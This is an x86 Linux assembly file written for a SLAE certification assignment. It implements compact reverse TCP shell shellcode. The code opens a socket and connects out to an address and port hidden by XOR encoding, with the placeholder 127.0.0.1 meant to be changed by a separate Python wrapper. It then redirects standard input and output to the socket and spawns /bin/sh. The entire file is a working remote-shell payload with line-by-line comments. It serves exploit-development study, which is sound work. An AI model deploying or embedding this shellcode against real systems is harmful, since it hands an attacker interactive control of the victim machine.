; Filename: 	reverse_tcp_shell.nasm
; Author:  	Samuel Dugo
; SLAE-ID:	SLAE-1376
; Size:		79 Bytes
; Purpose: 	Assignment #2 of SLAE certification. This shellcode creates a reverse tcp shell. The IP and Port need to be adjusted using the Python wrapper provided with this code.

global _start			

section .text
_start:

; Creating TCP socket
	xor eax,eax
	cdq
	; socket call requires socket(AF_INET,SOCK_STREAM,0)
	push edx                ;set socket.protocol = 0
	push 1                  
	pop ebx			 ;ebx is 0x1 to declare SYS_SOCKET function on sys_socketcall
	push ebx		 ;sets socket.type = 1 = SOCK_STREAM
	push 2                  ;sets socket.domain = 2 = AF_INET
	; sys_socketcall requires ecx--> args (loaded on esp), ebx --> SYS_SOCKET, eax --> 0x66
	mov al,0x66		 ;defines syscall as sys_socketcall(number,args)
	mov ecx,esp             ;loads the arguments on ecx
	int 0x80                ;executes the call to sys_socketcall

; Connecting the TCP socket
	pop ebx			 ;ebx is 0x2
	;*addr section
	mov edi,0x100007F       ;IP address to connect to is 127.0.0.1 (this will be decoded on runtime)
	xor edi,0xFFFFFFFF      ;decoder for the IP address
	push edi                ;loads the IP address
	mov si,0xb822           ;loads the variable port on SI register
	xor si,0xFFFF           ;decoder for the PORT number
	push si                 ;loads the PORT number
	push bx                 ;AF_INET = 2
	mov ecx,esp             ;saves the pointer of addr on ecx
	;now, store "sockfd,*addr,addrlen on ecx
	push byte 16            ;loads 16 bytes for addrlen (IPv4 = 4bytes*4)
	push ecx                ;loads the memory location of addr struct
	push eax                ;loads the fd
	mov ecx, esp
	inc ebx                 ;ebx is 0x3 to declare SYS_CONNECT function on sys_socketcall
	mov al,0x66             ;defines syscall as sys_socketcall(number,args)
	int 0x80                ;executes the call

; Redirecting STDIN, STDOUT and STDERR to a newly created socket from a client
	mov ecx,ebx             ;ecx now is 3
	mov ebx,eax             ;saves the oldfd on ebx
Redirection:
	dec ecx			 ;decrements by 1 ecx to pass through stdout,stdin,stderr
        mov al,0x3f             ;syscall number for sys_dup2
        int 0x80                ;executes dup2(oldfd,$ecx) for redirect stdout,stdin,stderr
	jnz Redirection	 ;repeats this process until zero flag is set

; Executing a shell
	push edx                ;loads NULL terminator
	push long 0x68732f2f    ;loads 'hs//'
	push long 0x6e69622f    ;loads 'nib/'
	mov ebx,esp             ;saves the pointer to '/bin//sh'
;	ecx & edx still contain NULL
	mov al,0x0b             ;configures eax for syscall - execve
	int 0x80                ;executes execve('//bin/sh',NULL,NULL)